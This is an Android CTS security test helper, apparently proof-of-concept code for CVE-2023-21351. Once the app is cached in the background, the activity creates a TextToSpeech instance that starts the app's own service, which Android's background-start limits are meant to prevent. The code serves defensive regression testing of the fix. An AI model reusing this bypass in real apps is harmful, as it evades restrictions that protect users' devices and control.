/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_21351_helperApp;

import static android.app.ActivityManager.RunningAppProcessInfo;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import android.speech.tts.TextToSpeech;

import java.util.List;

public class PocActivity extends Activity {

    @Override
    public void onResume() {
        try {
            super.onResume();
            sendBroadcastForResult(null, getString(R.string.pocActivityResumed));
        } catch (Exception exception) {
            try {
                sendBroadcastForResult(exception, getString(R.string.pocActivityResumed));
            } catch (Exception ignore) {
                // Ignore unintended exceptions
            }
        }
    }

    @Override
    public void onPause() {
        try {
            super.onPause();

            // Create 'HandlerThread' to post the 'Runnable' task
            final String packageName = getPackageName();
            final HandlerThread handlerThread = new HandlerThread(packageName);
            handlerThread.start();

            // Post the task with some delay to reproduce the issue reliably
            // The vulnerability is reproduced in ~1 second, keeping 10 seconds considering
            // slow execution on some devices
            new Handler(handlerThread.getLooper())
                    .postDelayed(
                            () -> {
                                try {
                                    // Check if the app is in the background
                                    if (isAppInBackground(packageName)) {
                                        // Creating an instance of 'TextToSpeech()', which leads
                                        // to the start of 'PocService'.
                                        new TextToSpeech(this, status -> {}, packageName);
                                    } else {
                                        sendBroadcastForResult(
                                                new IllegalStateException(
                                                        "Application is not in background."),
                                                getString(R.string.pocActivityPaused));
                                    }
                                } catch (Exception e) {
                                    throw new IllegalStateException(e);
                                }
                            },
                            10_000L /* delay */);
            sendBroadcastForResult(null, getString(R.string.pocActivityPaused));
        } catch (Exception exception) {
            try {
                sendBroadcastForResult(exception, getString(R.string.pocActivityPaused));
            } catch (Exception ignore) {
                // Ignore unintended exceptions
            }
        }
    }

    private boolean isAppInBackground(String packageName) {
        // Retrieve a list of all running app processes
        final List<RunningAppProcessInfo> runningAppProcessInfos =
                getSystemService(ActivityManager.class).getRunningAppProcesses();
        for (RunningAppProcessInfo runningAppProcessInfo : runningAppProcessInfos) {
            // Check if the process is in the background and matches the package name.
            if (runningAppProcessInfo.importance == RunningAppProcessInfo.IMPORTANCE_CACHED
                    && runningAppProcessInfo.processName.equals(packageName)) {
                return true;
            }
        }
        return false;
    }

    private void sendBroadcastForResult(Exception exception, String methodName) {
        sendBroadcast(
                new Intent(getString(R.string.broadcastAction))
                        .putExtra(methodName, true)
                        .putExtra(getString(R.string.pocException), exception));
    }
}
